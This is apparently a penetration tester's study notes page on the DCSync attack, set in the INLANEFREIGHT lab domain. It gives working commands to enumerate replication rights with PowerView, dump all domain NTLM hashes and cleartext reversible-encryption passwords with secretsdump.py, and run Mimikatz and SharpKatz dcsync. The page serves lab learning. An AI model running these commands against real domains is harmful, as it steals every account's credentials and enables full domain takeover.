# DCSync

technique for stealing the Active Directory password database by using the built-in \*\*`Directory Replication Service Remote Protocol (DRS**)`, which is used by Domain Controllers to replicate domain data. **use to read NTDS file (read all hashes of users)**

{% hint style="warning" %}
**need privilege `DS-Replication-Get-Changes-All`**
{% endhint %}

![image.png](<../../../../.gitbook/assets/image (1) (1).png>)

***

*   **Using Get-DomainUser to View adunn's Group Membership - SID**

    ```powershell
    Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
    ```

    <figure><img src="../../../../.gitbook/assets/image 1 (1).png" alt=""><figcaption></figcaption></figure>
*   **show privilege using sid**

    ```powershell
    $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
    Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
    ```

    ```powershell
    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
    ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

    AceQualifier          : AccessAllowed
    ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
    ActiveDirectoryRights : ExtendedRight
    SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
    ObjectAceType         : DS-Replication-Get-Changes
    ```
*   **Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**

    ```powershell
    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
    ```

    <figure><img src="../../../../.gitbook/assets/image 2 (1).png" alt=""><figcaption></figcaption></figure>

    **now we have 3 files with different type**
*

    <figure><img src="../../../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>
*   **Reversible Encryption**

    feature which using when service demand password as a clear text

    ![2025-06-27 15\_19\_25-reverse\_encrypt.png (1206×605) - Brave.png](<../../../../.gitbook/assets/2025 06 27_15_19_25 reverse_encrypt.png_(1206605)_ _Brave.png>)
*   **Enumerating Further using Get-ADUser**

    ```powershell
    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    ```

    <figure><img src="../../../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>
*   **Checking for Reversible Encryption Option using Get-DomainUser**

    ```powershell
    Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
    ```

    <figure><img src="../../../../.gitbook/assets/image 5.png" alt=""><figcaption></figcaption></figure>
*   **Displaying the Decrypted Password**

    ```powershell
    cat inlanefreight_hashes.ntds.cleartext 
    ```

    <figure><img src="../../../../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>

    We will notice the tool decrypted the password and provided us with the cleartext value.

***

### **Performing the DSync Attack with Mimikatz**

we use **runas.exe** to perform Mimikatz work with the privilege of target user

### **Using runas.exe**

to use Mimikatz u must to target one user not all domain user like `secretsdump.py`

```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```powershell
.\mimikatz.exe SyncMaster757
```

<figure><img src="../../../../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>

```powershell
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### **using sharpKatz**

```powershell
.\sharpKatz.exe --Command dcsync 
```

***
